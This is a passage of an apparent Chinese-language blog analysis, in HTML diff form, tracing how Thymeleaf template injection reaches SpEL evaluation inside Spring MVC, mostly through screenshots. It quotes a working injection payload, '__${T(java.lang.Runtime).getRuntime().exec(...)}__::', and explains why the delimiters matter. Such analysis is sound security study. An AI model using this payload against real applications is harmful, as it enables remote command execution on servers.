+<p>获得 <code>HelloController#path</code> 返回结果后， <code>invokeAndHandle</code> 随即调用 <code>returnValueHandlers.handleReturnValue</code> 处理 <code>returnValue</code></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306191618558.png"
+	width="1203"
+	height="370"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306191618558_hu3e4c4d750d61c0b47d60dab0c1f40664_58982_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306191618558_hu3e4c4d750d61c0b47d60dab0c1f40664_58982_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306191618558"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="325"
+		data-flex-basis="780px"
+	
+></p>
+<p><strong>HandlerMethodReturnValueHandlerComposite#handleReturnValue</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306191801834.png"
+	width="1336"
+	height="371"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306191801834_hudf6ea9311e28d534b6acb6da91c61f49_81245_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306191801834_hudf6ea9311e28d534b6acb6da91c61f49_81245_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306191801834"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="360"
+		data-flex-basis="864px"
+	
+></p>
+<p><code>selectHandler</code> 负责为 <code>returnValue</code> 选择合适的 <code>Handler</code>，处理 <code>String</code> 类型的是 <code>ViewNameMethodReturnValueHandler</code></p>
+<p><strong>ViewNameMethodReturnValueHandler#handleReturnValue</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306192154401.png"
+	width="1340"
+	height="492"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306192154401_huf0472866e41e594cce16ef27911b1dec_87659_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306192154401_huf0472866e41e594cce16ef27911b1dec_87659_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306192154401"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="272"
+		data-flex-basis="653px"
+	
+></p>
+<p><code>mavContainer</code>将<code>returnValue</code> 添加到 <code>viewName</code> 属性中，并调用<code>isRedirectViewName</code> 检测 <code>returnValues</code> 是否包含 <code>redirect:</code> 字段，如果包含，则将 <code>redirectModelScenario</code> 值设为 <code>true</code> ，表示重定向</p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306192721076.png"
+	width="1199"
+	height="213"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306192721076_hu7296344a6c661a961218931c9b424994_43541_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306192721076_hu7296344a6c661a961218931c9b424994_43541_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306192721076"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="562"
+		data-flex-basis="1350px"
+	
+></p>
+<p><strong>RequestMappingHandlerAdapter#invokeHandlerMethod</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306193514869.png"
+	width="1245"
+	height="471"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306193514869_hue7f1a77d47b9328de4b23e2cea88082a_78934_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306193514869_hue7f1a77d47b9328de4b23e2cea88082a_78934_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306193514869"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="264"
+		data-flex-basis="634px"
+	
+></p>
+<p>在执行完 <code>invocableMethod.invokeAndHandle</code> 方法后，<code>RequestMappingHandlerAdapter</code> 又调用 <code>getModelAndView</code> 方法创建 <code>ModelAndView</code> 对象。</p>
+<p><strong>RequestMappingHandlerAdapter#getModelAndView</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194342531.png"
+	width="1331"
+	height="452"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194342531_hu327cf72fe1a219f78d56de04405b0f88_91794_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194342531_hu327cf72fe1a219f78d56de04405b0f88_91794_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306194342531"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="294"
+		data-flex-basis="706px"
+	
+></p>
+<p><strong>DispatcherServlet#doDispatch</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194522060.png"
+	width="1327"
+	height="553"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194522060_hu5a3254eb953dbf89f6c1d902f7ba0a62_80973_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194522060_hu5a3254eb953dbf89f6c1d902f7ba0a62_80973_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306194522060"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="239"
+		data-flex-basis="575px"
+	
+></p>
+<p>获得 <code>ModelAndView</code> 对象后，<code>DispatcherServlet</code> 开始调用 <code>processDispatchResult</code> 处理返回结果</p>
+<p><strong>DispatcherServle#processDispatchResult</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194728292.png"
+	width="1306"
+	height="540"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194728292_hu463211e29ac705ea3113d56cf28ec8be_100347_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194728292_hu463211e29ac705ea3113d56cf28ec8be_100347_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306194728292"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="241"
+		data-flex-basis="580px"
+	
+></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194745071.png"
+	width="1327"
+	height="223"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194745071_hu0efd9f48b09e0f5af28042d2ffb236df_33237_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194745071_hu0efd9f48b09e0f5af28042d2ffb236df_33237_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306194745071"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="595"
+		data-flex-basis="1428px"
+	
+></p>
+<p>走解析视图的一般流程，进入 <code>render</code> 方法</p>
+<p><strong>DispatcherServle#render</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194845080.png"
+	width="1333"
+	height="453"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194845080_hue82f24a679e5d91a684842da448be3ce_93933_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306194845080_hue82f24a679e5d91a684842da448be3ce_93933_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306194845080"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="294"
+		data-flex-basis="706px"
+	
+></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306195257552.png"
+	width="1309"
+	height="529"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306195257552_hu34008c31759dd6fe4a385863c80403c4_72797_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306195257552_hu34008c31759dd6fe4a385863c80403c4_72797_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306195257552"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="593px"
+	
+></p>
+<p>这里会从 <code>mv</code> 获取 <code>viewName</code>，然后调用 <code>resolveViewName</code> 方法解析 <code>viewName</code> 获得 <code>view</code> （处理流程较为繁琐， <code>view</code> 是 <code>ThymeleafView</code> 类型） ，接着开始调用 <code>view.render</code> 解析视图</p>
+<p><strong>ThymeleafView#render</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306200123125.png"
+	width="1319"
+	height="126"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306200123125_hub1210ce2d07dcbc54265aad0aa56be4e_29514_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306200123125_hub1210ce2d07dcbc54265aad0aa56be4e_29514_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306200123125"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1046"
+		data-flex-basis="2512px"
+	
+></p>
+<p><strong>ThymeleafView#renderFragment</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306200234319.png"
+	width="1289"
+	height="531"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306200234319_hucd7a45b0f5367c8b874bcccd43c92f0c_99875_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306200234319_hucd7a45b0f5367c8b874bcccd43c92f0c_99875_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306200234319"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="242"
+		data-flex-basis="582px"
+	
+></p>
+<p><code>renderFragment</code> 方法会检查 <code>viewTemplateName</code> （即之前的 <code>returnValues</code>），如果包含 <code>::</code>，则会对其进行解析（因此我们的 <code>payload</code> 需要包含 <code>::</code>），跟进后续的代码</p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306200456346.png"
+	width="1286"
+	height="550"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306200456346_hu3224705502256f414a02cba87a248d76_94144_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306200456346_hu3224705502256f414a02cba87a248d76_94144_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306200456346"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="233"
+		data-flex-basis="561px"
+	
+></p>
+<p><strong>StandardExpressionParser#parseExpression</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306201258804.png"
+	width="1323"
+	height="209"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306201258804_huc2209eede356dc51634992f80b9c2932_59978_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306201258804_huc2209eede356dc51634992f80b9c2932_59978_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306201258804"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="633"
+		data-flex-basis="1519px"
+	
+></p>
+<p><code>input</code> 即为 <code>~{user/__${T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)}__::.x/welcome}</code></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306201343279.png"
+	width="1315"
+	height="466"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306201343279_hu71bb6a0f5034d7dec08e6828f01ee9e9_86152_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306201343279_hu71bb6a0f5034d7dec08e6828f01ee9e9_86152_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306201343279"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="282"
+		data-flex-basis="677px"
+	
+></p>
+<p><code>preprocess</code> 表示是否需要调用 <code>StandardExpressionPreprocessor.preprocess</code> 处理 <code>input</code></p>
+<p>此处传入的 <code>preprocess</code> 为 <code>true</code> ，代表需要处理 <code>input</code>，因此进入 <code>StandardExpressionPreprocessor.preprocess</code></p>
+<p><strong>StandardExpressionPreprocessor#preprocess</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306202052164.png"
+	width="1206"
+	height="185"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306202052164_hu3b1b402765c9886121fd8c90274a95cc_29839_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306202052164_hu3b1b402765c9886121fd8c90274a95cc_29839_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306202052164"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="651"
+		data-flex-basis="1564px"
+	
+></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306201922899.png"
+	width="1326"
+	height="243"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306201922899_hudc35a943b89d218a1bf13b4df1c13846_43286_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306201922899_hudc35a943b89d218a1bf13b4df1c13846_43286_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306201922899"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="545"
+		data-flex-basis="1309px"
+	
+></p>
+<p><code>preprocess</code> 会先判断 <code>input</code> 是否存在 <code>_</code>，没有就不解析</p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306202151701.png"
+	width="1282"
+	height="189"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306202151701_hue52f55846bf1ec9b6cf9415a9d86e177_34114_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306202151701_hue52f55846bf1ec9b6cf9415a9d86e177_34114_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306202151701"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="678"
+		data-flex-basis="1627px"
+	
+></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306202232577.png"
+	width="1294"
+	height="505"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306202232577_huea612d011dea9a754821c1ac9e3428f9_107484_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306202232577_huea612d011dea9a754821c1ac9e3428f9_107484_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306202232577"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="256"
+		data-flex-basis="614px"
+	
+></p>
+<p>对 <code>input</code> 进行正则表达式匹配，匹配的内容为 <code>\\_\\_(.*?)\\_\\_</code></p>
+<p><code>expressionText</code> 为匹配后的内容：<code>${T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)}</code></p>
+<p><strong>StandardExpressionPreprocessor#preprocess</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306204145991.png"
+	width="1332"
+	height="633"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306204145991_huc25eabbd7dbc53d023c5387aaeca9c36_103338_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306204145991_huc25eabbd7dbc53d023c5387aaeca9c36_103338_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306204145991"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="210"
+		data-flex-basis="505px"
+	
+></p>
+<p>执行完 <code>StandardExpressionParser.parseExpression</code>  后，开始解析 <code>expressionText</code></p>
+<p><strong>Expression#execute</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306205032947.png"
+	width="1309"
+	height="398"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306205032947_hu5420781e473f87080764604ff4eede16_72418_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306205032947_hu5420781e473f87080764604ff4eede16_72418_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306205032947"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="328"
+		data-flex-basis="789px"
+	
+></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306205045998.png"
+	width="1321"
+	height="435"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306205045998_hub3e50a73ddbdd43ae9925dbc4b539953_68457_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306205045998_hub3e50a73ddbdd43ae9925dbc4b539953_68457_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306205045998"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="303"
+		data-flex-basis="728px"
+	
+></p>
+<p><strong>SimpleExpression#executeSimple</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306205219247.png"
+	width="1331"
+	height="467"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306205219247_hueb75ce57fde3c956d5a01bcddae5de01_78999_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306205219247_hueb75ce57fde3c956d5a01bcddae5de01_78999_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306205219247"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="285"
+		data-flex-basis="684px"
+	
+></p>
+<p><strong>VariableExpression#executeVariableExpression</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306205307896.png"
+	width="1311"
+	height="481"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306205307896_hu416b3f648f11cc59f4a39187394ed7f6_94548_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306205307896_hu416b3f648f11cc59f4a39187394ed7f6_94548_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306205307896"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="272"
+		data-flex-basis="654px"
+	
+></p>
+<p><strong>SPELVariableExpressionEvaluator#evalue</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306210054494.png"
+	width="1342"
+	height="530"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306210054494_hudabeb37514aeea1384032e5c06f3e5a1_95038_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306210054494_hudabeb37514aeea1384032e5c06f3e5a1_95038_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306210054494"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="253"
+		data-flex-basis="607px"
+	
+></p>
+<p><code>SPELVariableExpressionEvaluator</code> 实现了 <code>IStandardVariableExpressionEvaluator</code> 接口，另外一个实现类是 <code>OGNLVariableExpressionEvaluator</code></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306210038236.png"
+	width="1293"
+	height="502"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306210038236_hue686616da3f16cf63a5f22e11645a3d6_97448_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306210038236_hue686616da3f16cf63a5f22e11645a3d6_97448_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306210038236"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="257"
+		data-flex-basis="618px"
+	
+></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306210711261.png"
+	width="1316"
+	height="440"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306210711261_hudccbc9bf88768cb0714010dee8caae66_71090_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306210711261_hudccbc9bf88768cb0714010dee8caae66_71090_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306210711261"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="299"
+		data-flex-basis="717px"
+	
+></p>
+<p>直到这步完成 <code>SpEL</code> 表达式解析</p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306210917535.png"
+	width="1302"
+	height="879"
